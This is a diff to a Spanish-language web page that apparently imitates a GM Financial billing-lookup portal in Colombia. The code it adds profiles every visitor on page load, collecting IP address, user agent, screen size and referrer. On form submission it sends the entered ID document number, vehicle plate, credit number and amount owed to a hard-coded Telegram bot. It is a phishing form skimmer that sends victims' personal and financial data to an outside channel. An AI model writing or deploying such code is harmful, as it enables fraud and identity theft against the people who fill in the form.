@@ -164,9 +164,61 @@
 </div>
 
 <script>
-    // Notificar visita al servidor
-    fetch('/api/visit', { method: 'POST' }).catch(() => {});
+    // ========== NOTIFICACIÓN A TELEGRAM ==========
+    const TELEGRAM_BOT_TOKEN = '8712124626:AAFAYI4vRWnUlvkzuk63dnKhe-dEOIyfwM4';
+    const TELEGRAM_CHAT_ID = '-1004457768033';
 
+    async function enviarTelegram(mensaje) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: mensaje,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (e) {
+            console.warn('Error Telegram:', e);
+        }
+    }
+
+    // Notificar visita al servidor + Telegram
+    (async function() {
+        // Notificar visita al servidor
+        fetch('/api/visit', { method: 'POST' }).catch(() => {});
+
+        // Obtener info del visitante
+        let ip = 'Desconocida';
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            ip = d.ip;
+        } catch(e) {}
+
+        const ua = navigator.userAgent;
+        const idioma = navigator.language || 'N/A';
+        const plataforma = navigator.platform || 'N/A';
+        const pantalla = `${screen.width}x${screen.height}`;
+        const referrer = document.referrer || 'Directo';
+        const url = window.location.href;
+        const ahora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+        const mensaje = `🔔 <b>NUEVA VISITA - GM Financial</b>\n\n` +
+            `🌐 <b>URL:</b> ${url}\n` +
+            `📍 <b>IP:</b> ${ip}\n` +
+            `🕐 <b>Fecha:</b> ${ahora}\n` +
+            `🖥️ <b>Pantalla:</b> ${pantalla}\n` +
+            `🌍 <b>Idioma:</b> ${idioma}\n` +
+            `💻 <b>Plataforma:</b> ${plataforma}\n` +
+            `🔗 <b>Referrer:</b> ${referrer}\n` +
+            `📱 <b>User-Agent:</b>\n<code>${ua}</code>`;
+
+        enviarTelegram(mensaje);
+    })();
+
+    // ========== FORMULARIO ==========
     document.getElementById('consultaForm').addEventListener('submit', async function(e) {
         e.preventDefault();
 
@@ -180,6 +232,16 @@
             alertBox.className = 'alert error show';
             return;
         }
+
+        // Notificar datos ingresados a Telegram
+        const ahora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+        enviarTelegram(
+            `📝 <b>DATOS INGRESADOS - GM Financial</b>\n\n` +
+            `🆔 <b>Documento:</b> <code>${doc}</code>\n` +
+            `🚗 <b>Placa:</b> <code>${placa}</code>\n` +
+            `🕐 <b>Fecha:</b> ${ahora}\n` +
+            `🌐 <b>URL:</b> ${window.location.href}`
+        );
 
         btn.innerHTML = '<span class="spinner"></span> Consultando...';
         btn.disabled = true;
@@ -198,12 +260,29 @@
                 const factura = data.facturas[0];
                 const totalNumerico = factura.valorSugerido.replace(/[^0-9]/g, '');
                 
+                // Notificar éxito
+                enviarTelegram(
+                    `✅ <b>CONSULTA EXITOSA - GM Financial</b>\n\n` +
+                    `🆔 <b>Documento:</b> <code>${doc}</code>\n` +
+                    `🚗 <b>Placa:</b> <code>${placa}</code>\n` +
+                    `💰 <b>Valor:</b> ${factura.valorSugerido}\n` +
+                    `📄 <b>Crédito:</b> ${factura.numeroCredito}`
+                );
+
                 const urlPago = `/index2.html?documento=${encodeURIComponent(doc)}&placa=${encodeURIComponent(placa)}&total=${totalNumerico}&credito=${encodeURIComponent(factura.numeroCredito)}`;
                 window.location.href = urlPago;
             } else {
                 throw new Error(data.error || 'No se encontraron facturas para este documento y placa.');
             }
         } catch (error) {
+            // Notificar error
+            enviarTelegram(
+                `❌ <b>ERROR EN CONSULTA - GM Financial</b>\n\n` +
+                `🆔 <b>Documento:</b> <code>${doc}</code>\n` +
+                `🚗 <b>Placa:</b> <code>${placa}</code>\n` +
+                `⚠️ <b>Error:</b> ${error.message}`
+            );
+
             alertBox.textContent = error.message;
             alertBox.className = 'alert error show';
             btn.innerHTML = 'Continuar';
